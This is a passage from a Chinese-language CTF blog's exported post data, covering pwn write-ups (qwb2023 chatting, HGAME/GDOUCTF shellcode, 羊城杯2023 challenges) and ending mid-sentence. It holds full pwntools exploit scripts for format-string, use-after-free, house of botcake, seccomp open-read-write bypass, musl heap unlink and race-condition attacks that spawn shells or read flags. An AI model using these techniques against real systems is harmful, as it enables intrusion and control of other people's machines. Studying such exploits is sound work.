0xe3afeogg2 = 0xe3b01ogg3 = 0xe3b04stack_printf_ret_addr = stack_printf_ret &amp; 0xffffsuccess(&#x27;stack_printf_ret_addr %s&#x27;,hex(stack_printf_ret_addr))#debug()#-----hijack ret_addr&amp;&amp;leak libc_basepayload=b&#x27;%19$p&#x27;payload+=b&#x27;%&#x27;+str(0x1205-6-8).encode()+b&#x27;c%10$hn&#x27;payload=payload.ljust(0x20,b&#x27;a&#x27;)payload+=p64(stack_printf_ret)p.send(payload)print(b&quot;[*]p1=&quot; + payload)p.recvuntil(b&#x27;0x&#x27;)libc_base=int(p.recv(12),16) - 0xf3 - libc.sym[&#x27;__libc_start_main&#x27;]one=libc_base+ogg2one1=one&amp;0xffffone2=(one&gt;&gt;16)&amp;0xffffsuccess(&#x27;libc_base: %s&#x27;,hex(libc_base))payload=b&#x27;%&#x27;+str(one2).encode()+b&#x27;c%10$hn&#x27;payload+=b&#x27;%&#x27;+str(one1-one2).encode()+b&#x27;c%11$hn&#x27;payload=payload.ljust(0x20,b&#x27;a&#x27;)payload+=p64(stack_ret-0x10+2)+p64(stack_ret-0x10)p.send(payload)print(b&quot;[*]p2=&quot; + payload)p.interactive()\n\n\n[qwb2023 pwn-chatting]逆向就死了 :(首先是64位linux的cpp，保护全开，glibc &#x3D; 2.27程序实现了一个通讯录，功能分别为：添加、删除、列出用户，发送和读取message发现一处UAF：首先程序里有两个存放 message 的地方：\n第一处是 0x2112E0，这个 vector 里面有许多个 entry，每个 entry 存放了所有收件人为某用户的 message。第二处是 0x211280（下图的 LOCAL_MSGLIST_ENTRY），如果 message 的收件人刚好是当前用户 (CURR_USER)，message 会同时存放至 MSG_LIST 和 LOCAL_MSGLIST_ENTR两个地方共用了同一个 message 指针漏洞点在于 delete：delete 用户时，程序会释放和清空 MSG_LIST 中的 entry 和 message 指针 ，但没有清空LOCAL_MSGLIST_ENTRY的 message 指针。\n因此：首先发送一条 message 给自己，然后删除当前用户，就能使用 read 功能读取 LOCAL_MSGLIST_ENTRY 中已释放 message 指针上的数据，从而泄漏内存地址。\n此外。delete中存在doublefree漏洞。\n这里选择用UAF泄露地址\n打house of botcake 劫持free hook\n#!/usr/bin/env python3from pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)context(os =&quot;Linux&quot;,arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)#p = remote(&quot;101.200.122.251&quot;, 14509)p = process(&#x27;./chatting&#x27;)libc = ELF(&quot;./libc-2.27.so&quot;)def add(n):    p.sendlineafter(&quot;add&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter new username: &quot;)    def delete(n):    p.sendlineafter(&quot;delete&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter username to delete: &quot;)    def message(to, ctx):    p.sendlineafter(&quot;message&quot;, &quot; exit): &quot;)    p.sendlineafter(to, &quot;To:&quot;)    p.sendlineafter(len(ctx), &quot;Message size:&quot;)    p.sendlineafter(ctx, &quot;Content:&quot;)def listuser():    p.sendlineafter(&quot;listuser&quot;, &quot; exit): &quot;)    def read():    p.sendlineafter(&quot;read&quot;, &quot; exit): &quot;)def switch(n):    p.sendlineafter(&quot;switch&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter username to switch to: &quot;)#  UAF p.sendline(&quot;str1k3&quot;)add(&quot;aaaa&quot;)add(&quot;bbbb&quot;)message(&quot;str1k3&quot;, &quot;a&quot;*0x500)message(&quot;xxxx&quot;, &quot;b&quot;*0x500)delete(&quot;str1k3&quot;) # BUG1message(&quot;xxxx&quot;, &quot;c&quot;*0x800)read()p.recvuntil(&quot;str1k3 -&gt; str1k3: &quot;)libc_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x3ec0d0success(&quot;libc_base: &quot;+ hex(libc_base))#  house of botcakeadd(&quot;A&quot;*0x80)add(&quot;B&quot;*0x80)add(&quot;C&quot;*0x80)add(&quot;D&quot;*0x80)add(&quot;E&quot;*0x80)add(&quot;F&quot;*0x80)switch(&quot;F&quot;*0x80)for i in range(7):    message(&quot;F&quot;*0x80, str(i)*0x80) # 事先创建大量 0x90 空闲堆块保护 unsorted bin chunkread()switch(&quot;A&quot;*0x80)message(&quot;A&quot;*0x80, &quot;a&quot;*0x100)switch(&quot;B&quot;*0x80)message(&quot;B&quot;*0x80, &quot;b&quot;*0x100)switch(&quot;C&quot;*0x80)for i in range(7):    message(&quot;C&quot;*0x80, str(i)*0x100) # 填充 tcache binread()switch(&quot;A&quot;*0x80)read()switch(&quot;B&quot;*0x80)read()switch(&quot;bbbb&quot;)message(&quot;xxxx&quot;, &quot;a&quot;*0x100)switch(&quot;B&quot;*0x80) read() # BUG2，Double free，chunk 同时位于 unosorted bin 和 tcache# free_hookswitch(&quot;bbbb&quot;)pp = b&#x27;A&#x27;*0x100+flat([0, 0x111, libc_base+0x3ed8e0])message(&quot;xxxx&quot;, pp.ljust(0x200)) # 篡改 tcache chunk fd 为 free_hookswitch(&quot;D&quot;*0x80)message(&quot;D&quot;*0x80, b&quot;/bin/sh&quot;.ljust(0x100, b&#x27;\\x00&#x27;))message(&quot;bbbb&quot;, (p64(0)+p64(libc.symbols[&quot;system&quot;])).ljust(0x100, b&#x27;\\x00&#x27;)) # 覆盖 free_hook 为 systemread() # 释放 &quot;/bin/sh&quot;p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"拿不到shell的shellcode","url":"/2023/08/01/%E6%8B%BF%E4%B8%8D%E5%88%B0shell%E7%9A%84shellcode/","content":"Shell we talk?Shall we talk?seccomp-tools下载\nsudo apt install gcc ruby-devgem install seccomp-tools\nThe arts of shellcode山海关巨佬的博客：https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode/1. [HGAME 2023 week1]simple_shellcodechecksec：\n[*] &#x27;/var/run/vmblock-fuse/blockdir/4JPOf1/vuln&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nsandbox:    \nroot@ubuntu:/home/str1k3/Desktop# seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/U0Wns2/vuln&#x27; line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000000  A = sys_number 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0004: 0x06 0x00 0x00 0x00000000  return KILL\n保护全开，沙盒禁用了system，考虑orw\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init();  mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);  puts(&quot;Please input your shellcode:&quot;);  read(0, (void *)0xCAFE0000LL, 0x10uLL);  sandbox();  MEMORY[0xCAFE0000]();  return 0;&#125;\n动调看到有一段权限都有的地址，可供写入shellcode。0x10的长度不够，所以我们要手搓shellcode来call一个read，以此写入orw的shellcode。\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA             Start                End Perm     Size Offset File        0xcafe0000         0xcafe1000 rwxp     1000      0 /dev/zero (deleted) ***    0x555555554000     0x555555555000 r--p     1000      0 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555555000     0x555555556000 r-xp     1000   1000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555556000     0x555555557000 r--p     1000   2000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555557000     0x555555558000 r--p     1000   2000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x555555558000     0x555555559000 rw-p     1000   3000 /home/str1k3/.cache/vmware/drag_and_drop/ixu541/vuln    0x7ffff7dc4000     0x7ffff7de6000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7de6000     0x7ffff7f5e000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7f5e000     0x7ffff7fac000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fac000     0x7ffff7fb0000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fb0000     0x7ffff7fb2000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so    0x7ffff7fb2000     0x7ffff7fb8000 rw-p     6000      0 [anon_7ffff7fb2]    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]\n把断点下到执行shellcode前的地方看看寄存器\n RAX  0x0 RBX  0x5555555553d0 (__libc_csu_init) ◂— endbr64  RCX  0x7ffff7ee3d3e (prctl+14) ◂— cmp rax, -0xfff RDX  0xcafe0000 ◂— xor dword ptr [rcx], esi /* 0xa343135343131; &#x27;114514\\n&#x27; */ RDI  0x16 RSI  0x2 R8   0x0 R9   0x0 R10  0x7ffff7ee3d3e (prctl+14) ◂— cmp rax, -0xfff R11  0x217 R12  0x555555555100 (_start) ◂— endbr64  R13  0x7fffffffe3f0 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffe300 ◂— 0x0 RSP  0x7fffffffe2f0 —▸ 0x7fffffffe3f0 ◂— 0x1*RIP  0x5555555553b9 (main+131) ◂— call rdx\nread(0,0xcafe0000+x（地址）,0x1000(长度))在系统调用中就是rax=0,rdi=0,rsi = 0xcafe0000+x（地址）rdx=0x1000(长度)那么我们对照上面的寄存器地址就可以构造第一个payload首先rax=0 不用改变，先把rdi变成0 然后再把rsi=0xCAFE0010,rdx本身就够大了 也不用改变shellcode=asm(&quot;&quot;&quot; mov rdi,rax mov rsi,0xCAFE0010 syscall nop &quot;&quot;&quot;) 或 看read的汇编   0x55555555538b &lt;main+85&gt;     mov    rax, qword ptr [rbp - 8]   0x55555555538f &lt;main+89&gt;     mov    edx, 0x10   0x555555555394 &lt;main+94&gt;     mov    rsi, rax   0x555555555397 &lt;main+97&gt;     mov    edi, 0   0x55555555539c &lt;main+102&gt;    mov    eax, 0   0x5555555553a1 &lt;main+107&gt;    call   read@plt                &lt;read@plt&gt;把eax和edi清零，把edx变得足够大，把esi改成要写入的位置，也可以达到同样的调用效果      shellcode1 = asm(&quot;&quot;&quot; xor eax, eax /* SYS_read */ xor edi, edi /* 0 */ mov edx, 0x1000 mov esi, 0xcafe0000 syscall &quot;&quot;&quot;)调用完read之后找一段orw的shellcode输进去即可shellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)  或利用shellcraftshellcode2 = b&quot;\\x90&quot; * 0x100   #？？？#shellcode2 += asm(shellcraft.open(&quot;/flag&quot;))shellcode2 += asm(shellcraft.read(3, 0xCAFE0500, 0x500))shellcode2 += asm(shellcraft.write(1, 0xCAFE0500, 0x500))\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#p=process(&#x27;./vuln&#x27;)p=remote(&#x27;node2.anna.nssctf.cn&#x27;,28311)shellcode1=asm(&#x27;&#x27;&#x27; mov rdi,rax; mov rsi,0xCAFE0010; syscall; nop; &#x27;&#x27;&#x27;)p.sendafter(&quot;Please input your shellcode:\\n&quot;,shellcode1)shellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)p.send(shellcode2)print(p.recv())print(p.recv())\n\n2. [GDOUCTF 2023]Random开了沙盒\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n0x60100到0x60200这段内存可读可写可执行，所以尝试把shellcode写入这段后将执行流劫持到该段haha函数内存在jmp rsp指令\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;# 连接远程p = remote(&quot;node6.anna.nssctf.cn&quot;,28969)# 加载rand函数的所在函数库libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))#设置srand函数jmp_sp = 0x40094Edata_addr = 0x601000#通过随机数验证  程序会跳转到vulnerable函数p.sendlineafter(&quot;num:&quot;,str(libc.rand()%50))&quot;&quot;&quot;利用 jmp_sp + asm 的攻击方式  让sp指针跳回变量地址 执行shellcode:     在data_addr 0x601000 写入orw_shellcode后    并跳转执行data_addr 0x12300的orw_shellcode&quot;&quot;&quot;payload=asm(shellcraft.read(0,data_addr,0x100))#调用read函数 在data_addr 0x601000处写入 orw_shellcode内容payload+=asm(&#x27;mov rax,0x601000;call rax&#x27;)#并且call ax寄存器 调用执行 data_addr 0x601000处的orw_shellcodepayload=payload.ljust(0x28,b&#x27;\\x00&#x27;)#打满变量空间 和 rbp寄存器的字节payload+=p64(jmp_sp)#返回地址写成jmp_esp，继续运行当前sp后续指令 填写别的返回地址 就无法控制程序后面的执行流程了payload+=asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)#此时sp已经离shellcode地址偏移0x30,这里把sp挪回到shellcode地址 并跳转到shellcodep.sendlineafter(&quot;your door\\n&quot;,payload)&quot;&quot;&quot;orw_shellcode执行的内容:打开本地的flag文件 把flag文件内容写入到 data_addr+0x100把输出data_addr+0x100的flag文件内容&quot;&quot;&quot;orw_shellcode = shellcraft.open(&quot;./flag&quot;)#打开本地的flag文件orw_shellcode += shellcraft.read(3, data_addr+0x100, 0x50)#文件描述符3:其它打开的文件 flag内容写入到data_addr+0x100orw_shellcode += shellcraft.write(1, data_addr+0x100,0x50)#文件描述符1:输出  地址data_addr+0x100存储的flag内容p.send(asm(orw_shellcode))p.interactive()\n\n基于堆漏洞的orw可以看setcontext\n","categories":["stack"],"tags":["shellcode"]},{"title":"羊城杯2023初赛_pwn_复现","url":"/2023/09/05/ycbCTF-pwn-review/","content":"这次羊城杯见识涨了不少复现完，应该能够窥见天才殿堂的一角了吧…2023-羊城杯-题目附件risky-loginrisc-v的题第一次看tnnd,搞半天环境不如用ghidra\nundefined8 FUN_123457ea(void)&#123;  undefined auStack_130 [288];    gp = &amp;__global_pointer$;  FUN_123456a0();  puts(&quot;RiskY LoG1N SySTem&quot;);  puts(&quot;Input ur name:&quot;);  read(0,&amp;DAT_12347078,8);  printf(&quot;Hello, %s&quot;);  puts(&quot;Input ur words&quot;);  read(0,auStack_130,0x120);  FUN_12345786(auStack_130);  puts(&quot;message received&quot;);  return 0;&#125;\n\nvoid FUN_12345786(char *param_1)&#123;  size_t sVar1;  char acStack_108 [248];    gp = &amp;__global_pointer$;  sVar1 = strlen(param_1);  DAT_12347070 = (byte)sVar1; //溢出  if (8 &lt; DAT_12347070) &#123;    puts(&quot;too long.&quot;);                    /* WARNING: Subroutine does not return */    exit(-1);  &#125;  strcpy(acStack_108,param_1);  return;&#125;\n溢出点在这里，强行转换为byte类型后会造成16个字节的溢出\nvoid FUN_123456ee(void)&#123;  char *pcVar1;    gp = &amp;__global_pointer$;  puts(&quot;background debug fun.&quot;);  puts(&quot;input what you want exec&quot;);  read(0,&amp;DAT_12347078,8);  pcVar1 = strstr(&amp;DAT_12347078,&quot;sh&quot;);  if ((pcVar1 == (char *)0x0) &amp;&amp; (pcVar1 = strstr(&amp;DAT_12347078,&quot;flag&quot;), pcVar1 == (char *)0x0)) &#123;    system(&amp;DAT_12347078);    return;  &#125;  puts(&quot;no.&quot;);                    /* WARNING: Subroutine does not return */  exit(-1);&#125;\n这个是后门函数，ban掉了”sh”和”flag”，可以通过cat f*来绕过\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;tcp.cloud.dasctf.com&#x27;,29560)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context(log_level=&#x27;debug&#x27;)system = 0x0000000000010760p.recvuntil(b&quot;Input ur name:&quot;)p.send(b&#x27;0&#x27;*8)p.recvuntil(b&quot;Input ur words&quot;)p.send(b&#x27;1&#x27;*0x100+p64(0x0000000123456EE))p.sendline(b&#x27;cat f*&#x27;)p.interactive()\n\nshellcode可以执行长度为 0x10 字节的 shellcode，shellcode 指令只能为 pop&#x2F;push &lt;寄存器&gt;。\n解题的关键点有两个：(1) shellcode 地址位于栈上；(2) 开头可以写任意 2 字节数据到栈上（也就是那个 “[2] Input: (ye &#x2F; no)”）。\n解题思路是先将 2 字节的 syscall 汇编指令码（\\x0f\\x05）写到栈上，然后利用 pop&#x2F;push 指令将指令码复制到 shellcode 内存末尾，并布置好寄存器，最后调用 read 系统调用读入 cat flag shellcode 到 shellcode 内存上。\n栈上有一个缓冲区地址恰好指向我们输入的 syscall 指令码，可以把这个缓冲区地址 pop 到 rsp，将 syscall 指令码 pop 到某个寄存器后，再次利用 pop&#x2F;push 指令将 rsp 改成事先保存好的 shellcode 内存地址，最后利用 pop 指令将 syscall 指令码写到 shellcode 内存地址上即可。\n执行 shellcode 前加载了 seccomp 沙盒，只能调用 open, write, read 和 dup2 系统调用，并限制 read 和 write fd 参数的范围（read 限制 fd &lt;&#x3D;2、write 限制 fd &gt;2）。 fd 限制可以利用 dup2 重定向 fd 来绕过。\nfrom pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)context(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p = remote(&quot;tcp.cloud.dasctf.com&quot;, 27135)p.sendafter(&quot;[2] Input: (ye / no)&quot;, b&quot;\\x0f\\x05&quot;) sc1 = asm(&quot;&quot;&quot;push raxpop rsipush rbxpop raxpush rbxpop rdipop rbxpop rbxpop rsppop rdxpush rsipop rsppop rbxpop rbxpop rbxpush rdxpush rdx&quot;&quot;&quot;)p.sendafter(&quot;[5] ======== Input Your P0P Code ========&quot;, sc1)sc2 = &quot;nop\\n&quot;*0x12sc2 += &quot;&quot;&quot;mov rsp, r12mov rax, 0x67616c662fpush raxmov rdi, rspmov rsi, 0mov rax, 2syscallmov rdi, raxmov rsi, 0mov rax, 33syscallmov rdi, 1mov rsi, 23mov rax, 33syscallmov rdi, 0mov rsi, rspmov rdx, 0x100mov rax, 0syscallmov rdi, 23mov rax, 1syscall&quot;&quot;&quot;p.send(asm(sc2))p.interactive()\n\ncookieBox先贴篇文章https://www.anquanke.com/post/id/202253#h3-12很详细，看完来看题\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  char *v3; // rdx  const char *v4; // rdi  char v5[256]; // [rsp+10h] [rbp-110h] BYREF  _QWORD v6[2]; // [rsp+110h] [rbp-10h] BYREF  v6[1] = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  v3 = v5;  memset(v5, 0, sizeof(v5));  v4 = (const char *)v6;  while ( 1 )  &#123;    sub_400CE8(v4, 0LL, v3);    switch ( (unsigned int)sub_400980() )    &#123;      case 1u:        sub_400A50();        break;      case 2u:        sub_400B69();        break;      case 3u:        sub_400C59();        break;      case 4u:        sub_400BE1();        break;      case 5u:        exit(0);      default:        v4 = &quot;invalid choice&quot;;        puts(&quot;invalid choice&quot;);        break;    &#125;  &#125;&#125;\n常规菜单题，增删改查\nint sub_400C59()&#123;  unsigned int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Please input the idx:&quot;);  v1 = sub_400980();  if ( v1 &lt;= 0xF &amp;&amp; (&amp;buf)[v1] &amp;&amp; *((_DWORD *)&amp;nbytes + v1) )  &#123;    puts(&quot;Please input the content:&quot;);    read(0, (&amp;buf)[v1], *((unsigned int *)&amp;nbytes + v1));    puts(&quot;Done&quot;);  &#125;  return puts(&quot;Idx Error&quot;);&#125;\nfree之后没有把指针清空，存在UAF\n第一步泄漏 libc 基址，musl-libc 把程序内存或者 libc 内存的空闲内存划为堆内存，耗尽后才会申请动态内存。泄露堆地址就可以得到程序基址或 libc 基址\nleak 之后可以利用 unbin 进行unlink，unbin 没有检查prev和next指针是否合法，通过堆溢出我们可以改写这两个指针，利用 unbin 向任意地址写指针地址，即*(uint64_t*)(prev + 2) &#x3D; next和*(uint64_t*)(next + 3) &#x3D; prev。\n可以将 prev改成 io(stdin stdout)，然后把 next改成 bss地址，然后申请一个 chunk 0x100，就可以实现将任意地址写入 bss 地址，然后再申请，即可任意申请io写io，然后改io为 binsh 打system即可\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;cookieBox&#x27;)libc = ELF(&#x27;libc.so&#x27;)p = process(&#x27;./cookieBox&#x27;)#p = remote(&#x27;tcp.cloud.dasctf.com&#x27;, 25633)def debug():    gdb.attach(p)     pause()    def add(size, payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size:\\n&quot;)    p.sendline(str(size))    p.recvuntil(&quot;Content:\\n&quot;)    p.send(payload)def free(idx):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;2&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))def edit(idx, payload):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;3&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))    p.recvuntil(&quot;content:\\n&quot;)    p.send(payload)def show(idx):    p.recvuntil(&quot;&gt;&gt;&quot;)    p.sendline(&quot;4&quot;)    p.recvuntil(&quot;idx:\\n&quot;)    p.sendline(str(idx))add(0x100, b&#x27;a&#x27;*8)  #chunk0add(0x100, b&#x27;a&#x27;*8)  #chunk1add(0x100, b&#x27;a&#x27;*8)  #chunk2add(0x100, b&#x27;a&#x27;*8)  #chunk3show(0)p.recv(8)libc.address = u64(p.recvuntil(b&quot;\\x7f&quot;).ljust(0x8,b&quot;\\x00&quot;)) - 0x292e50success(&quot;libc.address--&gt;&quot;+hex(libc.address))    #leak_libc_basestdin = libc.address + 0x292200success(&quot;stdin--&gt;&quot;+hex(stdin))system = libc.sym[&#x27;system&#x27;]success(&quot;system--&gt;&quot;+hex(system))bss = 0x602060free(1)add(0x100, b&#x27;1&#x27;)  #chunk4free(1)           #double_free chunk1edit(4, p64(stdin) + p64(0x602070-0x10)) #bss_addr#debug()add(0x100, b&quot;A&quot;)  #chunk5,fake_chunkpayload = b&quot;/bin/sh\\x00&quot;payload += b&#x27;A&#x27; * 0x20payload += p64(0x22222222) # stdin -&gt; wpos -&gt; stdin -&gt; wbasepayload += b&#x27;A&#x27; * 8payload += p64(0x11111111)payload += b&#x27;A&#x27; * 8payload += p64(system)edit(2, payload)p.recvuntil(&quot;&gt;&gt;&quot;)p.sendline(&quot;5&quot;)p.interactive()\n\neasy_vm\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  puts(&quot;It&#x27;s a easy vmpwn,enjoy it&quot;);  ptr = malloc(0x1000uLL);  malloc(0x20uLL);  free(ptr);//进入unsortedbin，其 fd、bk 指针指向 main_arena+88 的位置（第一个进入unsortedbin的chunk的性质）,可以泄露libc  ptr = 0LL;  qword_201040 = (__int64)malloc(0x1000uLL);  buf = malloc(0x1000uLL);     puts(&quot;Inputs your code:&quot;);  read(0, buf, 0x1000uLL);  while ( *(_BYTE *)buf )  &#123;    switch ( *(_BYTE *)buf )    &#123;      case 1:        qword_201040 += 8LL;        *(_QWORD *)qword_201040 = qword_201038; //保存201038的内容        buf = (char *)buf + 8;        break;      case 2:        qword_201038 = *(_QWORD *)qword_201040;        qword_201040 -= 8LL;        buf = (char *)buf + 8;        break;      case 3:        *(_QWORD *)qword_201038 = *(_QWORD *)qword_201040;//赋值，将201040里的内容赋给201038        buf = (char *)buf + 8;        break;      case 4:        qword_201038 ^= *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;      case 5:        qword_201038 = *(_QWORD *)qword_201038;        buf = (char *)buf + 8;        break;      case 6:        qword_201038 += *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;      case 7:                                             qword_201038 -= *((_QWORD *)buf + 1);        buf = (char *)buf + 16;        break;        //case6 case7可以实现调偏移      default:        buf = (char *)buf + 8;        break;    &#125;  &#125;  exit(0);&#125;\none_gadget\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\n先给 0x201038 一个 libc（2），算 one_gadget（7）保存到 0x201040（1），再算 exit_hook（6），用（3）将 one_gadget 赋值到 0x201038 的 exit_hook 中。\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#p = process(&#x27;./easy_vm&#x27;)p = remote(&#x27;tcp.cloud.dasctf.com&#x27;,23804)libc = ELF(&#x27;./libc-2.23.so&#x27;)libc = 0x3c4b78exit1 = 0x5f0040 + 3848exit2 = 0x5f0040 + 3856one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]payload = p64(2)                    #libcpayload+= p64(7)                    payload+= p64(libc - one_gadget[3]) #calc_onegadgetpayload+= p64(1)                    #gadget_push_in_201040 payload+= p64(6)                    payload+= p64(exit1 - one_gadget[3])#calc_exit_hook payload+= p64(3)                    #gdb.attach(p)p.recvuntil(&#x27;Inputs your code:\\n&#x27;)p.sendline(payload)p.interactive()\nheap\nunsigned __int64 __fastcall sub_1732(char *a1)&#123;  int v2; // [rsp+10h] [rbp-120h]  int v3; // [rsp+14h] [rbp-11Ch]  const char *src; // [rsp+18h] [rbp-118h]  const char *srca; // [rsp+18h] [rbp-118h]  char dest[264]; // [rsp+20h] [rbp-110h] BYREF  unsigned __int64 v7; // [rsp+128h] [rbp-8h]  v7 = __readfsqword(0x28u);  src = strtok(a1, &quot;:&quot;);  if ( src )  &#123;    strcpy(a1, src);    srca = strtok(0LL, &amp;byte_21DA);    if ( srca )      strcpy(dest, srca);  &#125;  puts(&quot;The paper index loading&quot;);  v2 = atoi(a1);  v3 = *(_DWORD *)(*((_QWORD *)s + v2) + 8LL);  sleep(1u);   //竞争窗口  if ( (unsigned int)v2 &lt;= 0xF &amp;&amp; *((_QWORD *)s + v2) )  &#123;    printf(&quot;paper index: %d\\n&quot;, (unsigned int)v2);    puts(&quot;Input the new paper content&quot;);    strncpy(**((char ***)s + v2), dest, v3);    puts(&quot;Done&quot;);  &#125;  else  &#123;    puts(&quot;Invalid paper index&quot;);  &#125;  return v7 - __readfsqword(0x28u);&#125;\n多线程未加锁导致竞争条件。edit 存在 1 秒的竞争窗口，且竞争窗口过后没有更新 v3。同时没有限制堆块大小，可以申请一个大chunk1在竞争窗口中free掉chunk1，同时申请小堆块chunk2此时可以对chunk2进行溢出\nint __fastcall sub_1469(const char *a1)&#123;  int result; // eax  int i; // [rsp+10h] [rbp-10h]  int v3; // [rsp+14h] [rbp-Ch]  _DWORD *v4; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15 &amp;&amp; *((_QWORD *)s + i); ++i )    ;  if ( i == 16 )    return puts(&quot;paper pool is full&quot;);  v3 = strlen(a1);  if ( v3 &lt;= 79 || v3 &gt; 104 )    return puts(&quot;paper size error&quot;);  v4 = malloc(0x10uLL);  *(_QWORD *)v4 = malloc(v3);  v4[2] = v3;  printf(&quot;creating paper with index %d\\n&quot;, (unsigned int)i);  puts(&quot;Input the paper content&quot;);  strncpy(*(char **)v4, a1, v3);  puts(&quot;Done&quot;);  result = (int)v4;  *((_QWORD *)s + i) = v4;  return result;&#125;\n溢出对象是保存堆块地址的小堆块,也就是这里的v4因为edit用的是\nstrncpy(*(char **)v4, a1, v3);\n我们要注意溢出空间不能过大，以免破坏其他数据\n首先泄漏 libc 地址。线程的堆块都分配至单独的线程堆 （堆地址以 0x7f 